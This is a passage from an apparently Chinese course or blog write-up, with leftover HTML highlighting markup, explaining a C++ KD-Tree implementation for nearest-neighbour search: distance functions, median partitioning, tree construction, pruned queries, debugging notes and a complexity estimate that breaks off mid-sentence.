punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用全局变量 <code>int dimension</code> 记录操作向量的维数, <code>Node</code> 结构体支持存储一个 $k$ 维向量, 其中 $2\le k\le 5$.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 26</span><span class="token keyword">struct</span> <span class="token class-name">Tree</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> v<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    Node p<span class="token punctuation">;</span>    <span class="token keyword">bool</span> leftnode <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">bool</span> rightnode <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">bool</span> is_leaf <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span> tree<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> N<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每个 <code>Tree</code> 结构体实例对应 <code>KD-Tree</code> 中的一个节点, <code>leftnode</code> 与 <code>rightnode</code> 记录了其是否存在左、右子节点, <code>is_leaf</code> 记录其是否为叶节点.</p><p>每个 <code>Tree</code> 实例内部保存了一个向量 <code>Node p</code>, 而 <code>int v[5][2]</code> 记录了其对应的 <code>KD-Tree</code> 节点集在 $k$ 维空间内覆盖的范围, 其中 <code>v[i][0]</code>, <code>v[i][1]</code> 分别记录了 <code>Tree</code> 节点在空间中第 $i$ 维的范围.</p><h4 id="Euclid-距离"><a href="#Euclid-距离" class="headerlink" title="Euclid 距离"></a>Euclid 距离</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 36</span>ll <span class="token function">Dist</span><span class="token punctuation">(</span>Node x<span class="token punctuation">,</span> Node y<span class="token punctuation">)</span><span class="token punctuation">{</span>    ll dis <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        dis <span class="token operator">+=</span> <span class="token number">1ll</span> <span class="token operator">*</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> y<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> y<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> dis<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先为两个向量定义其 $Euclid$ 距离.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 44</span>ll <span class="token function">Dist</span><span class="token punctuation">(</span>Node x<span class="token punctuation">,</span> Tree y<span class="token punctuation">)</span><span class="token punctuation">{</span>    ll dis <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> dist<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> y<span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> y<span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;</span> y<span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> y<span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        dis <span class="token operator">+=</span> <span class="token number">1ll</span> <span class="token operator">*</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> dis<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再为一个点与一个区域定义其最短 $Euclid$ 距离. 逐次比较该点第 $i$ 维的坐标与区域在第 $i$ 维的坐标范围, 并取最短距离. 将每个维度的距离综合即得到了该点到此区域的最短 $Euclid$ 距离.</p><h4 id="中位排序"><a href="#中位排序" class="headerlink" title="中位排序"></a>中位排序</h4><p>我们定义一个中位排序操作, 它将序列的中位数放置到正确的位置, 同时满足前半段的元素均小于中位元素, 后半段的元素均大于中位元素.</p><p>该算法具体实现参考自<a href="https://zhuanlan.zhihu.com/p/145456043">此教程</a>, 是一种期望为线性时间的选择算法, 时间复杂度在平均情况下为 $O(n)$.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 58</span><span class="token keyword">void</span> <span class="token function">Swap</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Node tmp <span class="token operator">=</span> node<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>    node<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">;</span>    node<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">Partion</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> k <span class="token operator">=</span> l<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> node<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">Swap</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>            k<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token function">Swap</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">FindMedium</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token function">Partion</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">==</span> mid<span class="token punctuation">)</span> <span class="token keyword">return</span> k<span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">&gt;</span> mid<span class="token punctuation">)</span> r <span class="token operator">=</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> l <span class="token operator">=</span> k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每次 <code>Partion()</code> 操作的执行都能确定一个元素的正确位置 (若该元素为第 $k$ 大, 那么其一定处于第 $k$ 位), 同时其左的元素均小于该元素, 其右的元素均大于该元素. 如果 <code>Partion</code> 返回的位置恰为序列的中位, 那么中位排序已完成; 否则递归对剩余元素进行中位排序即可.</p><h4 id="建树"><a href="#建树" class="headerlink" title="建树"></a>建树</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 104</span><span class="token keyword">void</span> <span class="token function">Build</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> direction<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">==</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>p <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>is_leaf <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    comp <span class="token operator">=</span> direction<span class="token punctuation">;</span>    <span class="token function">FindMedium</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>p <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>leftnode <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token function">Build</span><span class="token punctuation">(</span><span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>direction <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> dimension<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>rightnode <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token function">Build</span><span class="token punctuation">(</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token punctuation">(</span>direction <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> dimension<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PushUp</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中全局变量 <code>int comp</code> 的取值范围为 $[0, dimension - 1]$, 它记录了当前建树时从哪个维度的坐标对当前向量进行排序.</p><p>一个 <code>tree[k]</code> 节点可能会对应多个 <code>Node</code> 向量, 我们调用 <code>FindMedium(l, r)</code> 对这些向量排序, 将按第 <code>comp</code> 维度的坐标排序后的中位向量放置在 <code>Node node[N]</code> 中位 <code>node[mid]</code> 上, 同时满足在其之前的向量的第 <code>comp</code> 维度坐标均小于 <code>node[mid]</code> , 在其之后的向量的第 <code>comp</code> 维度坐标均大于 <code>node[mid]</code>.</p><p>随后将 <code>node[mid]</code> 记录在 <code>tree[k]</code> 中, 并递归建立其左右子树, 在 <code>tree[k]</code> 内使用 <code>bool leftnode</code> 与 <code>bool rightnode</code> 记录, 最后调用 <code>PushUp(k)</code> 自底向顶更新每个 <code>tree[k]</code> 内的节点集所覆盖的区域的端点.</p><h4 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h4><p>对于叶节点, 我们在 <code>Build()</code> 中将其覆盖的区域端点设置为该点本身:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 107</span><span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">==</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 叶节点</span>    tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>p <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>is_leaf <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于含有子节点的父节点 <code>tree[k]</code>, 根据我们建树的方式, 其右子节点 <code>tree[right]</code> 必然存在. 首先在右子节点 <code>tree[right]</code> 的覆盖区域内加入点 <code>tree[k].p</code>; 若左子节点 <code>tree[left]</code> 存在, 再使用其覆盖区域更新 <code>tree[k]</code> 的覆盖区域.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 89</span><span class="token keyword">void</span> <span class="token function">PushUp</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> right <span class="token operator">=</span> <span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>p<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>p<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>leftnode <span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tree<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tree<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 134</span><span class="token keyword">void</span> <span class="token function">Query</span><span class="token punctuation">(</span>Node p<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ANS <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>ANS<span class="token punctuation">,</span> <span class="token function">Dist</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>is_leaf<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>leftnode <span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        ll left_min <span class="token operator">=</span> <span class="token function">Dist</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> tree<span class="token punctuation">[</span><span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ll right_min <span class="token operator">=</span> <span class="token function">Dist</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> tree<span class="token punctuation">[</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>left_min <span class="token operator">&lt;</span> right_min<span class="token punctuation">)</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">else</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">Dist</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> tree<span class="token punctuation">[</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> ANS<span class="token punctuation">)</span>            <span class="token function">Query</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>给出点 <code>Node p</code> 与子树 <code>tree[k]</code>, 我们给出 <code>p</code> 到 <code>tree[k]</code> 中的点的最短距离. 其中 <code>ANS</code> 是一个记录当前查询到的最短距离的全局变量, 在每次总查询前, 我们将其复位为 <code>INF = 1e16</code>.</p><p>首先使用 <code>tree[k]</code> 内记录的点与 <code>p</code> 的距离更新最短距离 <code>ANS</code>; 若左子节点不存在, 特判 <code>p</code> 到 <code>tree[right]</code> 区域的最小值, 当小于 <code>ANS</code> 时执行向下递归查询; 若左子节点存在, 那么同时计算 <code>p</code> 到 <code>tree[left]</code> 区域的最小值, 并首先递归查询距离较短的子树.</p><h4 id="输入与查询"><a href="#输入与查询" class="headerlink" title="输入与查询"></a>输入与查询</h4><p>封装为 <code>Init()</code> 与 <code>Work()</code> 函数.</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><ul><li>起初出现了 <code>Runtime Error(trap 14)</code> 的报错, 在对 <code>Tree[]</code> 进行扩容后消除, 这是因为对 $n$ 个点建立 <code>KD-Tree</code> 需要不止 $n$ 个 <code>Tree</code> 节点来存储.</li><li>使用全局变量 <code>comp</code> 记录当前建树所选取坐标轴的维度, 并在向下递归过程中将其 <code>+ 1</code>.</li><li>首次实现时, 我将所有向量都保存叶节点内, 这样做会导致第 $13$ 个点开始出现 <code>Time Limit Exceeded</code>. 再次实现时, 我在每个内部节点也保存了一个向量值, 并在 <code>Query()</code> 过程向左右子树递归时, 首先访问距离较短的那一个, 起到了剪枝优化的效果.</li><li>对于 <code>FindMedium()</code> 的实现参考了 <a href="https://zhuanlan.zhihu.com/p/145456043">此教程</a>.</li></ul><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p><code>Init()</code> 过程读入输入数据的时间复杂度为 $O(nd)$, 建树过程中每一步时间消耗主要源自 <code>FindMedium(l, r)</code>, 这是 $O(n)$ 复杂度的, 逐层建树的时间复杂度为 $O(nlogn)$.</p><p>每次进行 <code>Query()</code> 都进行了剪枝操作, 优化了访问不可能包含答案点的区域的情形. 考虑最坏情况下查询的时间复杂度, 与遍历一棵 $d$ 维 